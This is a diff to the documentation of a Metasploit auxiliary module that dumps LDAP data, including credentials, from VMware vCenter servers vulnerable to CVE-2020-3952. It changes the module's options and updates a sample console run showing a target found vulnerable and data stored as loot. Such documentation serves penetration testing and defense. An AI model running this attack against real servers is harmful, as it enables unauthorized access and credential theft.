@@ -4,7 +4,8 @@
 
 This module uses an anonymous-bind LDAP connection to dump data from
 the vmdir service in VMware vCenter Server version 6.7 prior to the
-6.7U3f update.
+6.7U3f update, only if upgraded from a previous release line, such as
+6.0 or 6.5.
 
 ### Setup
 
@@ -23,10 +24,9 @@ Dump all LDAP data from the vCenter Server.
 
 ## Options
 
-### ConnectTimeout
+### BASE_DN
 
-You may configure the timeout for LDAP connects if necessary. The
-default is 10.0 seconds and should be more than sufficient.
+If you already have the LDAP base DN, you may set it in this option.
 
 ## Scenarios
 
@@ -38,10 +38,12 @@ msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > options
 
 Module options (auxiliary/gather/vmware_vcenter_vmdir_ldap):
 
-   Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT   389              yes       The target port
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   BASE_DN                   no        LDAP base DN if you already have it
+   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    636              yes       The target port
+   SSL      true             no        Enable SSL on the LDAP connection
 
 
 Auxiliary action:
@@ -55,6 +57,7 @@ msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > set rhosts [redacted]
 rhosts => [redacted]
 msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > run
 [*] Running module against [redacted]
+not verifying SSL hostname of LDAPS server '[redacted]:636'
 
 [*] Discovering base DN automatically
 [*] Searching root DSE for base DN
@@ -69,19 +72,11 @@ supportedldapversion: 3
 supportedsaslmechanisms: GSSAPI
 
 [+] Discovered base DN: dc=vsphere,dc=local
-[*] Dumping LDAP data from vmdir service at [redacted]:389
-[+] [redacted]:389 is vulnerable to CVE-2020-3952
+[*] Dumping LDAP data from vmdir service at [redacted]:636
+[+] [redacted]:636 is vulnerable to CVE-2020-3952
 [*] Storing LDAP data in loot
 [+] Saved LDAP data to /Users/wvu/.msf4/loot/20200417002613_default_[redacted]_VMwarevCenterS_939568.txt
 [*] Password and lockout policy:
-dn: cn=password and lockout policy,dc=vsphere,dc=local
-cn: password and lockout policy
-enabled: TRUE
-ntsecuritydescriptor:: [redacted]
-objectclass: top
-objectclass: vmwLockoutPolicy
-objectclass: vmwPasswordPolicy
-objectclass: vmwPolicy
 vmwpasswordchangeautounlockintervalsec: [redacted]
 vmwpasswordchangefailedattemptintervalsec: [redacted]
 vmwpasswordchangemaxfailedattempts: [redacted]
@@ -96,6 +91,8 @@ vmwpasswordminspecialcharcount: [redacted]
 vmwpasswordminuppercasecount: [redacted]
 vmwpasswordprohibitedpreviouscount: [redacted]
 
+[+] Credentials found: [redacted]
+[snip]
 [*] Auxiliary module execution completed
 msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) >
 ```
